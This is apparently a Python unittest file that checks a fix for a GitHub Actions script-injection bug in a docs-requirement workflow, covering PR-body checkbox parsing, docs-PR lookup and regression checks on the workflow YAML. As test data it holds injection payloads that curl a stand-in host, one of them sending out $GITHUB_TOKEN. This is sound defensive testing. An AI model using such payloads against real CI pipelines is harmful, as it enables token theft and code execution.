#!/usr/bin/env python3

"""
Tests for the require-docs workflow logic.

This workflow checks two things when a PR is opened:
  1. Whether the contributor ticked the "documentation needed" checkbox
  2. Whether a matching docs PR has been merged in krkn-chaos/website

We had a script injection bug where GitHub expressions like
${{ github.event.pull_request.body }} were pasted directly into shell commands.
A malicious PR body could run arbitrary code in CI. These tests make sure:
  - the checkbox detection logic works correctly in all cases
  - the docs PR search handles edge cases gracefully
  - the old vulnerable patterns are gone from the workflow YAML

How to run:
    python -m unittest tests.test_require_docs_workflow -v

Fixed in: .github/workflows/require-docs.yml
"""

import os
import re
import unittest


# ---------------------------------------------------------------------------
# Checkbox detection helper
# This mirrors what the workflow's jq + grep does in Step 1:
#   jq -r '.pull_request.body // ""' "$GITHUB_EVENT_PATH" | grep -qi '\[x\].*documentation needed'
# ---------------------------------------------------------------------------

def _docs_required(pr_body: str) -> bool:
    """Check if the PR body has the documentation checkbox ticked."""
    if not pr_body:
        return False
    return bool(re.search(r"\[x\].*documentation needed", pr_body, re.IGNORECASE))


# ---------------------------------------------------------------------------
# Merged docs PR search helper
# This mirrors what the workflow's github-script does in Step 2:
#   pulls.find(pr => pr.merged_at && pr.title.includes(featureBranch))
# ---------------------------------------------------------------------------

def _find_merged_docs_pr(pulls: list, feature_branch: str):
    """Find the first merged PR in krkn-chaos/website whose title mentions the branch."""
    for pr in pulls:
        if pr.get("merged_at") and feature_branch in pr.get("title", ""):
            return pr
    return None


# ===========================================================================
# Suite 1 — Does the checkbox detection work?
# ===========================================================================

class TestDocsCheckboxDetection(unittest.TestCase):
    """
    Make sure we correctly detect when a contributor has ticked
    the 'documentation needed' checkbox in their PR description.
    """

    # cases where the box IS ticked

    def test_checked_checkbox_lowercase_detected(self):
        """Basic case — [x] with lowercase text should match."""
        body = "Some text\n- [x] documentation needed\nMore text"
        self.assertTrue(_docs_required(body))

    def test_checked_checkbox_mixed_case_detected(self):
        """The check is case-insensitive, so 'Documentation Needed' works too."""
        body = "- [x] Documentation Needed for this PR"
        self.assertTrue(_docs_required(body))

    def test_checked_checkbox_uppercase_detected(self):
        """All-caps should still match."""
        body = "[x] DOCUMENTATION NEEDED"
        self.assertTrue(_docs_required(body))

    def test_checked_checkbox_with_extra_text_between(self):
        """Extra words between [x] and 'documentation needed' are fine."""
        body = "[x] Is documentation needed? Yes it is."
        self.assertTrue(_docs_required(body))

    def test_checked_checkbox_multiline_body(self):
        """Works even when the checkbox is buried in a full PR template."""
        body = (
            "## Description\nFixed a bug.\n\n"
            "## Checklist\n"
            "- [x] self-review done\n"
            "- [x] documentation needed\n"
            "- [ ] tests added\n"
        )
        self.assertTrue(_docs_required(body))

    # cases where the box is NOT ticked

    def test_unchecked_checkbox_not_detected(self):
        """An empty box [ ] should never count as checked."""
        body = "- [ ] documentation needed"
        self.assertFalse(_docs_required(body))

    def test_no_checkbox_at_all_not_detected(self):
        """Just mentioning 'documentation needed' in text isn't enough."""
        body = "This PR fixes a typo. No documentation needed."
        self.assertFalse(_docs_required(body))

    def test_empty_body_not_detected(self):
        """Empty PR body should quietly return False, not blow up."""
        self.assertFalse(_docs_required(""))

    def test_none_body_not_detected(self):
        """GitHub can send a null PR body — we handle it the same way as empty."""
        self.assertFalse(_docs_required(None))

    def test_whitespace_only_body_not_detected(self):
        """A body of just spaces/newlines counts as empty."""
        self.assertFalse(_docs_required("   \n\t  "))

    # injection payloads — these should never trigger a match

    def test_injection_payload_semicolon_not_detected(self):
        """
        A shell injection payload in the PR body shouldn't confuse the regex.
        Before the fix, this could have run arbitrary commands in CI.
        """
        body = '"; curl http://evil.com/steal?token=$GITHUB_TOKEN; echo "'
        self.assertFalse(_docs_required(body))

    def test_injection_payload_with_docs_text_not_detected(self):
        """
        Even if the attacker writes 'documentation needed' alongside the
        injection payload, the unchecked box means it still returns False.
        """
        body = '[ ] documentation needed"; exit 1; echo "'
        self.assertFalse(_docs_required(body))

    def test_injection_payload_checked_with_injection(self):
        """
        If someone ticks the box AND adds shell commands after it, the
        regex still safely returns True/False — the shell never sees the body.
        That's the whole point of the fix.
        """
        body = '[x] documentation needed\n$(curl http://evil.com)'
        self.assertTrue(_docs_required(body))


# ===========================================================================
# Suite 2 — Does the merged docs PR search work?
# ===========================================================================

class TestMergedDocsPRSearch(unittest.TestCase):
    """
    Make sure we can reliably find a merged docs PR in krkn-chaos/website
    that corresponds to the contributor's feature branch.
    This replaced the old 'gh pr list' shell command that was injectable.
    """

    def _make_pr(self, title: str, merged: bool = True) -> dict:
        """Quick helper to build a fake PR dict like what GitHub's API returns."""
        return {
            "title": title,
            "merged_at": "2024-01-01T00:00:00Z" if merged else None,
            "html_url": "https://github.com/krkn-chaos/website/pull/42",
        }

    # when a matching PR exists

    def test_finds_merged_pr_matching_branch(self):
        """Should find a PR whose title contains the branch name."""
        pulls = [
            self._make_pr("fix: update docs for fix-auth-bug"),
            self._make_pr("chore: unrelated PR"),
        ]
        result = _find_merged_docs_pr(pulls, "fix-auth-bug")
        self.assertIsNotNone(result)
        self.assertIn("fix-auth-bug", result["title"])

    def test_returns_first_matching_merged_pr(self):
        """If there are multiple matches, we want the first one."""
        pulls = [
            self._make_pr("docs: fix-auth-bug round 1"),
            self._make_pr("docs: fix-auth-bug round 2"),
        ]
        result = _find_merged_docs_pr(pulls, "fix-auth-bug")
        self.assertEqual(result["title"], "docs: fix-auth-bug round 1")

    # when no matching PR exists

    def test_returns_none_when_no_matching_pr(self):
        """None of the PRs match the branch — should return None."""
        pulls = [
            self._make_pr("chore: update dependencies"),
            self._make_pr("fix: unrelated issue"),
        ]
        result = _find_merged_docs_pr(pulls, "my-feature-branch")
        self.assertIsNone(result)

    def test_returns_none_for_empty_pulls_list(self):
        """GitHub returns an empty list — nothing to find, return None."""
        result = _find_merged_docs_pr([], "my-feature-branch")
        self.assertIsNone(result)

    def test_skips_unmerged_prs(self):
        """A PR that was opened but not merged shouldn't count."""
        pulls = [
            self._make_pr("docs: fix-auth-bug", merged=False),
        ]
        result = _find_merged_docs_pr(pulls, "fix-auth-bug")
        self.assertIsNone(result)

    def test_unmerged_and_merged_pr_returns_merged_one(self):
        """If there's a draft and a merged PR, we should pick the merged one."""
        pulls = [
            self._make_pr("docs: fix-auth-bug draft", merged=False),
            self._make_pr("docs: fix-auth-bug final", merged=True),
        ]
        result = _find_merged_docs_pr(pulls, "fix-auth-bug")
        self.assertIsNotNone(result)
        self.assertEqual(result["title"], "docs: fix-auth-bug final")

    # edge cases

    def test_branch_name_with_special_chars_matches_safely(self):
        """
        Branch names with dots, slashes, underscores are matched as plain
        strings — not as regex patterns — so there's no risk of regex injection.
        """
        pulls = [self._make_pr("docs: update for feature/my.special-branch_v2")]
        result = _find_merged_docs_pr(pulls, "feature/my.special-branch_v2")
        self.assertIsNotNone(result)

    def test_empty_feature_branch_matches_any_pr_with_empty_string_in_title(self):
        """
        Edge case: an empty string is technically 'in' every string.
        Just making sure this doesn't crash — the behaviour is predictable.
        """
        pulls = [self._make_pr("docs: some PR")]
        result = _find_merged_docs_pr(pulls, "")
        self.assertIsNotNone(result)


# ===========================================================================
# Suite 3 — Is the workflow YAML itself actually fixed?
# ===========================================================================

WORKFLOW_PATH = os.path.join(
    os.path.dirname(__file__),
    "..", ".github", "workflows", "require-docs.yml"
)


class TestWorkflowSecurityRegression(unittest.TestCase):
    """
    These tests read the actual workflow file and check that the old
    vulnerable patterns are gone. Think of them as a guardrail —
    if anyone accidentally reintroduces the injection bug in a future PR,
    these will fail loudly in CI before it gets merged.
    """

    def setUp(self):
        with open(WORKFLOW_PATH, "r") as f:
            self.workflow_content = f.read()

    def test_pr_body_not_interpolated_in_run_block(self):
        """
        The old bug: PR body dropped directly into a shell echo command.
        Now we read it from $GITHUB_EVENT_PATH using jq instead.
        """
        self.assertNotIn(
            "${{ github.event.pull_request.body }}",
            self.workflow_content,
            "PR body must not be pasted into a shell command — use jq + $GITHUB_EVENT_PATH.",
        )

    def test_head_ref_not_interpolated_in_run_block(self):
        """
        Same issue with the branch name — it was being put into shell directly.
        Now it's accessed safely inside the github-script JS context.
        """
        self.assertNotIn(
            "${{ github.head_ref }}",
            self.workflow_content,
            "Branch name must not be pasted into a shell command — use context.payload in JS.",
        )

    def test_step1_uses_github_event_path_not_expression(self):
        """
        Step 1 should be reading the PR body from the event JSON file,
        not from a ${{ }} expression that expands before the shell runs.
        """
        self.assertIn(
            "GITHUB_EVENT_PATH",
            self.workflow_content,
            "Step 1 must use $GITHUB_EVENT_PATH + jq to read the PR body safely.",
        )

    def test_step2_still_uses_github_script_for_api(self):
        """
        Step 2 needs to call the GitHub API, so actions/github-script is the
        right tool — it handles the token and keeps user input out of shell.
        """
        self.assertIn(
            "actions/github-script",
            self.workflow_content,
            "Step 2 must use actions/github-script for the cross-repo API call.",
        )

    def test_no_echo_with_expression_interpolation(self):
        """
        'echo \"${{' is the classic pattern that caused this bug in the first place.
        Make sure it never comes back.
        """
        self.assertNotRegex(
            self.workflow_content,
            r'echo\s+"?\$\{\{',
            "Echoing a ${{ }} expression into shell is a script injection risk.",
        )

    def test_workflow_file_exists(self):
        """Basic sanity check — the file should be where we expect it."""
        self.assertTrue(
            os.path.isfile(WORKFLOW_PATH),
            f"Workflow file not found at: {WORKFLOW_PATH}",
        )


if __name__ == "__main__":
    unittest.main()